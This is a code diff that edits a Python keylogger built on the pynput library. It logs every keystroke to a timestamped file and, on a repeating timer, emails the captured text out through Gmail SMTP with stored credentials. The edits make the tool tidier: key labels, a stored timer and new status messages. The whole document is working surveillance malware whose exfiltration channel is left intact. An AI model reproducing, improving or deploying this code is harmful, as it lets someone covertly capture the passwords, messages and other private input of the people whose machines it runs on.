@@ -12,9 +12,9 @@ from pynput.keyboard import Key
 # Dictionary for cleaner display of special keys
 SPECIAL_KEYS = {
     Key.space: " ",
-    Key.enter: "\n",
+    Key.enter: "[ENTER]",
     Key.backspace: "[BACKSPACE]",
-    Key.tab: "\t\t",
+    Key.tab: "[TAB]",
     Key.shift: "[SHIFT]",
     Key.shift_r: "[SHIFT-R]",
     Key.ctrl_l: "[CTRL-L]",
@@ -34,16 +34,15 @@ SPECIAL_KEYS = {
 class EnhancedKeyLogger:
     def __init__(self, email, password, interval=120):
         # Initialize configuration
+        self.timer=None
         self.email = email
         self.password = password
         self.interval = interval
-        self.log_data = ""
+        self.log_data = "Key Logger Started!!\n"
         self.start_time = datetime.datetime.now()
-
         # Create "Log" folder if it doesn't exist
         log_dir = os.path.join(os.getcwd(), "Captured_Logs")
         os.makedirs(log_dir, exist_ok=True)
-
         # Setup basic file logging
         log_filename = f"keylog_{self.start_time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
         self.log_file_path = os.path.join(log_dir, log_filename)
@@ -59,7 +58,7 @@ class EnhancedKeyLogger:
             current_key = str(key.char)
         except AttributeError:
             # Handle special keys from the SPECIAL_KEYS dictionary
-            current_key = SPECIAL_KEYS.get(key, f"[{key.name.upper()}]") 
+            current_key = SPECIAL_KEYS.get(key, f"[{key.name.upper()}]")
         self.append_to_log(current_key)
 
     def report(self):
@@ -67,16 +66,16 @@ class EnhancedKeyLogger:
         if self.log_data.strip():
             try:
                 timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                message = f"\n\n[Log Time: {timestamp}]\n{self.log_data}"
+                message = f"\n[Log Time: {timestamp}]\n{self.log_data}"
                 self.send_email(self.email, self.password, message)
                 self.log_data = ""  # Reset log
             except Exception as e:
                 self.append_to_log(f"\n[!] Failed to send email: {str(e)}\n")
 
         # Schedule next report
-        timer = threading.Timer(self.interval, self.report)
+        self.timer = threading.Timer(self.interval, self.report)
         #timer.daemon = True
-        timer.start()
+        self.timer.start()
 
     def send_email(self, email, password, message):
         # Send logs via Gmail SMTP
@@ -84,7 +83,7 @@ class EnhancedKeyLogger:
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
-        print(f"=========MAIL SENT!========\n")
+        print(f"[+] Mail Sent successfully!!\n")
         server.quit()
 
     def start(self):
